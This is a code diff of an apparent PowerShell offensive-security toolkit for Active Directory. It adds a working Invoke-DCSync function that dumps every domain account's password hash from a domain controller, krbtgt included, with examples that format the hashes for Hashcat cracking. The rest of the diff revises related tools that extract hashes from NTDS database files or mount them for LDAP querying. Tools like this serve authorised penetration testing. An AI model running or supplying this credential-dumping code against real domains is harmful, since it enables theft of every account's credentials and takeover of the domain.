@@ -1,3 +1,91 @@
+function Invoke-DCSync {
+<#
+.SYNOPSIS
+    Dump domain accounts from Active Directory.
+
+    Author: Timothee MENOCHET (@TiM0)
+
+.DESCRIPTION
+    Invoke-DCSync extracts domain accounts from Active Directory via DCSync attack, including password hashes.
+    By default, all account objects are returned
+
+.NOTES
+    DSInternals powershell module must be installed first:
+    PS C:\> Install-Module -Name DSInternals
+
+.PARAMETER DomainController
+    Specifies the target domain controller.
+
+.PARAMETER Credential
+    Specifies the privileged account to use (typically Domain Admin).
+
+.PARAMETER SamAccountName
+    Specifies the identifier of an account that will be extracted from Active Directory.
+    By default, all domain accounts will be retrieved.
+
+.EXAMPLE
+    PS C:\> Invoke-DCSync | Format-Custom -View HashcatNT
+
+.EXAMPLE
+    PS C:\> Invoke-DCSync -DomainController DC.ADATUM.CORP -Credential ADATUM\Administrator -SamAccountName krbtgt
+#>
+	Param (
+		[ValidateNotNullOrEmpty()]
+		[String]
+		$DomainController = $env:LOGONSERVER,
+
+		[ValidateNotNullOrEmpty()]
+		[System.Management.Automation.PSCredential]
+		[System.Management.Automation.Credential()]
+		$Credential = [System.Management.Automation.PSCredential]::Empty,
+
+		[ValidateNotNullOrEmpty()]
+		[String]
+		$SamAccountName
+	)
+
+	# Check if DSInternals module is installed
+	If(-Not(Get-Module -Name DSInternals -ListAvailable)) {
+		Write-Warning "This command must be launched on a computer with Active Directory PowerShell module installed"
+		Exit 1
+	} Else {
+		Import-Module DSInternals
+	}
+
+	# Retrieve base DN
+	$BaseURI = "LDAP://" + $DomainController
+	$SearchString = $BaseURI + "/RootDSE"
+	If ($Credential.UserName) {
+		$DomainObject = New-Object System.DirectoryServices.DirectoryEntry($SearchString, $Credential.UserName, $Credential.GetNetworkCredential().Password)
+	} Else {
+		$DomainObject = New-Object System.DirectoryServices.DirectoryEntry($SearchString)
+	}
+	$BaseDN = $DomainObject.defaultNamingContext
+
+	If ($SamAccountName) {
+		# Retrieve NetBIOS name 
+		$SearchString = $BaseURI + "/" + "cn=Partitions," + $DomainObject.configurationNamingContext
+		If ($Credential.UserName) {
+			$DomainObject = New-Object System.DirectoryServices.DirectoryEntry($SearchString, $Credential.UserName, $Credential.GetNetworkCredential().Password)
+			$Searcher = New-Object System.DirectoryServices.DirectorySearcher($DomainObject)
+		} Else {
+			$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
+		}
+		$Searcher.Filter = "(&(objectCategory=crossRef)(ncName=" + $BaseDN + "))"
+		$Searcher.SearchScope = "OneLevel";
+		$Null = $Searcher.PropertiesToLoad.Add("nETBIOSName")
+		$Results = $Searcher.FindAll()
+		$NetbiosName = $Results[0].Properties["nETBIOSName"]
+		$Results.dispose()
+		$Searcher.dispose()
+		# Dump a specific domain account
+		Get-ADReplAccount -SamAccountName "$SamAccountName" -Server "$DomainController" -Domain $NetbiosName -Credential $Credential
+	} Else {
+		# Dump all domain accounts
+		Get-ADReplAccount -All -NamingContext "$BaseDN" -Server "$DomainController" -Credential $Credential
+	}
+}
+
 function Get-NtdsDatabase {
 <#
 .SYNOPSIS
@@ -19,14 +107,12 @@ function Get-NtdsDatabase {
     Specifies the privileged account to use (typically Domain Admin).
 
 .EXAMPLE
-    PS C:\> Get-NtdsDatabase -DomainController DC.ADATUM.CORP
+    PS C:\> Get-NtdsDatabase
 
 .EXAMPLE
     PS C:\> Get-NtdsDatabase -DomainController DC.ADATUM.CORP -TargetDirectory C:\Windows\Temp -Credential ADATUM\Administrator
 #>
-
 	Param (
-		[Parameter(Mandatory=$true)]
 		[ValidateNotNullOrEmpty()]
 		[String]
 		$DomainController = $env:LOGONSERVER,
@@ -117,27 +203,27 @@ function Dump-NtdsDatabase {
 
 .DESCRIPTION
     Dump-NtdsDatabase extracts domain accounts from NTDS database and SYSTEM hive files, including password hashes.
-	By default, all account objects are returned.
+    By default, all account objects are returned.
 
 .NOTES
     DSInternals powershell module must be installed first:
-	PS C:\> Install-Module -Name DSInternals
+    PS C:\> Install-Module -Name DSInternals
 
 .PARAMETER SystemHiveFilePath
     Specifies the path to an offline SYSTEM registry hive.
 
 .PARAMETER DatabasePath
-	Specifies the path to an offline NTDS database.
+    Specifies the path to an offline NTDS database.
 
 .PARAMETER SamAccountName
-    Specifies the identifier of an account that will be retrieved from the database.
-	By default, all domain accounts will be retrieved.
+    Specifies the identifier of an account that will be extracted from the database.
+    By default, all domain accounts will be retrieved.
 
 .EXAMPLE
     PS C:\> Dump-NtdsDatabase | Format-Custom -View HashcatNT
 
 .EXAMPLE
-    PS C:\> Dump-NtdsDatabase -DatabasePath C:\Windows\Temp\ntds.dit -SystemHiveFilePath C:\Windows\Temp\SYSTEM -SamAccountName Administrator
+    PS C:\> Dump-NtdsDatabase -DatabasePath C:\Windows\Temp\ntds.dit -SystemHiveFilePath C:\Windows\Temp\SYSTEM -SamAccountName krbtgt
 #>
 	Param (
 		[ValidateNotNullOrEmpty()]
@@ -166,7 +252,7 @@ function Dump-NtdsDatabase {
 	If($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -ne $true) {
 		Write-Warning "This command must be launched as an Administrator" 
 		Exit 1
-    }
+        }
 
 	# Read the Boot Key from the SYSTEM registry hive
 	$key = Get-BootKey -SystemHiveFilePath "$SystemHiveFilePath"
@@ -187,16 +273,16 @@ function Mount-NtdsDatabase {
     Author: Timothee MENOCHET (@TiM0)
 
 .DESCRIPTION
-	Mount-NtdsDatabase exposes a NTDS database file as a Lightweight Directory Access Protocol (LDAP) server using DSAMain.exe.
-	Database can then be queried using Invoke-LdapSearch or PowerView.
+    Mount-NtdsDatabase exposes a NTDS database file as a Lightweight Directory Access Protocol (LDAP) server using DSAMain.exe.
+    Database can then be queried using Invoke-LdapSearch or PowerView.
 
 .NOTES
-	Local administrative privileges are required.
-	Moreover, Active Directory Lightweight Directory Services (AD LDS) must be installed first:
-	# Windows Server
-	PS C:\> Enable-WindowsOptionalFeature -FeatureName "DirectoryServices-ADAM" -Online
-	# Windows Workstation
-	PS C:\> Enable-WindowsOptionalFeature -FeatureName "DirectoryServices-ADAM-Client" -Online
+    Local administrative privileges are required.
+    Moreover, Active Directory Lightweight Directory Services (AD LDS) must be installed first:
+    # Windows Server
+    PS C:\> Enable-WindowsOptionalFeature -FeatureName "DirectoryServices-ADAM" -Online
+    # Windows Workstation
+    PS C:\> Enable-WindowsOptionalFeature -FeatureName "DirectoryServices-ADAM-Client" -Online
 
 .PARAMETER DatabasePath
     Specifies the path to the database file.
@@ -237,7 +323,7 @@ function Mount-NtdsDatabase {
 	If($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -ne $true) {
 		Write-Warning "This command must be launched as an Administrator" 
 		Exit 1
-    }
+        }
 
 	Write-Host "[*] Mounting NTDS database as a LDAP server"
 	If ($AllowUpgrade) {
@@ -269,15 +355,15 @@ function Invoke-LdapSearch {
     Author: Timothee MENOCHET (@TiM0)
 
 .DESCRIPTION
-	Invoke-LdapSearch builds a directory searcher object using ADSI and searches for objects matching a custom LDAP filter.
-	By default, all account objects for the target directory are returned.
-	Uses LDAP protocol for compatibility with NTDS databases exposed through Mount-NtdsDatabase.
+    Invoke-LdapSearch builds a directory searcher object using ADSI and searches for objects matching a custom LDAP filter.
+    By default, all account objects for the target directory are returned.
+    Uses LDAP protocol for compatibility with NTDS databases exposed through Mount-NtdsDatabase.
 
 .PARAMETER Server
     Specifies the target directory server.
 
 .PARAMETER Configuration
-	Rather than searching in the default path, switches to the configuration naming context.
+    Rather than searching in the default path, switches to the configuration naming context.
 
 .PARAMETER LdapFilter
     Specifies an LDAP query string that is used to filter Active Directory objects.
